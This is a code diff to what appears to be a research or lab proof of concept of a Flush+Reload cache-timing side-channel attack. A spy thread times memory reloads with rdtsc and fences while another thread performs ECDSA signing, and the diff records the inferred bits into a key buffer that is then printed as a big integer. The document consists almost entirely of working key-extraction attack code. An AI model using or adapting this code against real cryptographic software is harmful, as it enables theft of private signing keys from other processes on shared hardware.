@@ -1,7 +1,8 @@
 #include"spy.h"
-void* addr_Pmul = (void*)&EllPoint::MulP;
+void* addr_Pmul = (void*)&EllPoint::SpyMul;
 void* addr_Padd = (void*)&EllPoint::Add;
 void* addr_Pdoub = (void*)&EllPoint::Pdouble;
+extern int Stop_spy =0;
 
 inline void maceess(void* addr)
 {
@@ -30,7 +31,7 @@ unsigned long long int get_FlushReload_time()
 	reload_time=0;
 	flush_time=0;
 	int a[16];
-	void* addr=addr_Padd;
+	void* addr=(void*)&access_test;
 	unsigned long long int count =10000;
 	maceess(addr);
 	for(int i=0;i<count;i++)
@@ -54,26 +55,28 @@ unsigned long long int get_FlushReload_time()
 	printf("reload:%llu,flush:%llu\n",reload_time,flush_time);
 	return (reload_time+flush_time)/2;
 }
-bool flush_reload(void* addr)
+bool __attribute((always_inline)) flush_reload(void* addr)
 {
     unsigned long long int start,end;
-        start = rdtsc();
-		maceess(addr);
-		end = rdtsc();
-
-        flush(addr);
-        //printf("%llu\n",end-start);
-        if((end-start)<flush_reload_threshold)
-        {
-            return 1;
-        }
-        return 0;
+	asm volatile("mfence");
+    start = rdtsc();
+	maceess(addr);
+	end = rdtsc();
+	asm volatile("mfence");
+    flush(addr);
+        printf("%llu\n",end-start);
+    if((end-start)<flush_reload_threshold)
+    {
+        return 1;
+    }
+    return 0;
 }
 
 
 void* spyth(void* arg)
 {
 		int i = 0;
+		void* addr = (void*)&access_test;
 		while(!Stop_spy)
 		{
 			pthread_mutex_lock(&mutex);
@@ -81,7 +84,7 @@ void* spyth(void* arg)
 			{
 				pthread_cond_wait(&cond,&mutex);
 			}
-			if(flush_reload(addr_Padd))
+			if(flush_reload(addr))
 			{
 				printf("1 ");
 				key[i]='1';
@@ -92,7 +95,7 @@ void* spyth(void* arg)
 				key[i]='0';
 			}
 			i++;
-			flush(addr_Padd);
+			flush(addr);
 			if(i>500){break;}
 			alternate =1;
 			pthread_mutex_unlock(&mutex);
@@ -108,7 +111,7 @@ SignGen sign;
 void* signth(void* arg)
 {
 	sign.Ecdsa_sign_gen("insada");
-	Stop_spy =1;
+	//Stop_spy =1;
 	return 0;
 }
 
@@ -123,6 +126,9 @@ void Spytest()
 	pthread_join(sign_thread,NULL);
 	pthread_join(spy_thread,NULL);
 	printf("\n%s\n",key);
+	mpz_t mpz_key;
+	mpz_init_set_str(mpz_key,key,2);
+	mpz_printf(mpz_key);
 	flush(addr_Pdoub);
 	flush(addr_Padd);
 }
